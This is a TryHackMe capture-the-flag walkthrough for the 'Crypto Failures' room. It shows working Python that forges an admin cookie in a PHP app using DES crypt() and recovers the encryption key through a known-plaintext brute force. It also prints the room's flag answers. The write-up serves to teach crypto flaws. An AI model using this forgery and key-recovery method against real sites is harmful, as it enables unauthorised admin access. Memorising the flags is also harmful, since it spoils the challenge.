# 🏆 Walkthrough: Crypto Failures

## Room info
- Platform: TryHackMe
- Target: 10.49.167.251
- Date solved: 2026-04-01
- Objectives: web flag, encryption key

## Summary
PHP web app uses home-rolled DES-based cookie encryption. The `secure_cookie` is built from `user:User-Agent:ENC_SECRET_KEY`, split into 8-byte chunks, each encrypted with `crypt(chunk, 2-char-salt)` (PHP DES). The salt is embedded as the first 2 chars of the cookie. Because "guest" and "admin" are both 5 chars, all chunks after the first are identical — only chunk 1 needs to be forged to escalate to admin. The encryption key is then recovered char-by-char via known-plaintext: varying the User-Agent length shifts each KEY char into a known position in a DES chunk, leaving only 1 unknown to brute-force per character.

## Task answers

### Task 1 — Exploit broken encryption
- Question: What is the value of the web flag?
- Answer: `THM{ok_you_f0und_w3b_fl4g_6cbe2bc}`

### Task 2 — Recover encryption key
- Question: What is the encryption key?
- Answer: `THM{Traditional_Own_Crypto_is_Always_Surprising!_and_this_hopefully_is_not_easy_to_crack_e41d20b5b0989cac65ed4a090cace944bf30e6d3ab88f9d447f52fd2140525b9}`

## Enumeration

### Nmap
```bash
nmap -Pn -sV -sC --top-ports 1000 --min-rate 5000 10.49.167.251
```

Key findings:
- Port 22: OpenSSH 8.9p1 (Ubuntu)
- Port 80: Apache 2.4.59 (Debian), redirects to `/`
- PHP/8.3.8 via X-Powered-By header

### Web enumeration
- `index.php.bak` exposed full PHP source
- HTML comment: `<!-- TODO remember to remove .bak files-->`
- Two cookies set: `user=guest` (plaintext) and `secure_cookie=<DES-encrypted blob>`

## Exploitation

### Discovery
Source leak via `index.php.bak`. Cookie structure revealed:
```
secure_cookie = crypt(chunk1, salt) || crypt(chunk2, salt) || ...
where: plaintext = user + ":" + User-Agent + ":" + ENC_SECRET_KEY
       salt      = first 2 chars of secure_cookie
       chunk     = 8-byte split of plaintext
```

### Admin cookie forgery (Task 1)
```python
from passlib.hash import des_crypt
from urllib.parse import unquote
import requests

UA = "AAAAAAAA"
r = requests.get('http://TARGET/', allow_redirects=False, headers={'User-Agent': UA})
cookie = unquote(r.cookies['secure_cookie'])
salt = cookie[:2]

# Forge only chunk 1: "admin:AA" instead of "guest:AA"
new_chunk1 = des_crypt.using(salt=salt).hash("admin:" + UA[:2])
forged = new_chunk1 + cookie[13:]

r2 = requests.get('http://TARGET/',
                  cookies={'user': 'admin', 'secure_cookie': forged},
                  headers={'User-Agent': UA})
# → "congrats: THM{...}"
```

### Key recovery (Task 2)
Known-plaintext attack: vary UA length so KEY[n] is the sole unknown in a DES chunk.

For KEY[n], use UA length `L = (8 - n%8) % 8` (min 8). Then KEY[n] lands at position 7 of its chunk — 7 known chars + 1 unknown → 94 brute-force attempts per char.

```python
# To recover KEY[n]:
L = (8 - n % 8) % 8 or 8
cookie = get_decoded_cookie("A" * L)
salt = cookie[:2]
chunk_idx = (7 + L + n) // 8
chunk_prefix = ("guest:" + "A"*L + ":" + key_so_far)[chunk_idx*8:chunk_idx*8+7]
target = cookie[chunk_idx*13:(chunk_idx+1)*13]
# brute: des_crypt("chunk_prefix" + c, salt) == target
```

## Flags
- web flag: `THM{ok_you_f0und_w3b_fl4g_6cbe2bc}`
- encryption key: `THM{Traditional_Own_Crypto_is_Always_Surprising!_and_this_hopefully_is_not_easy_to_crack_e41d20b5b0989cac65ed4a090cace944bf30e6d3ab88f9d447f52fd2140525b9}`

## Lessons learned
- OWASP A02: Never implement custom crypto — PHP `crypt()` with a 2-char salt is DES, insecure by default
- Backup files (`.bak`) expose source code — always check in web recon
- Short repeating keys in block-aligned encryption enable known-plaintext attacks: if two plaintexts share a common suffix, only the differing prefix block needs to be forged
- DES only uses the first 8 bytes of input per block — allows char-by-char key recovery by controlling UA length to shift chunk boundaries
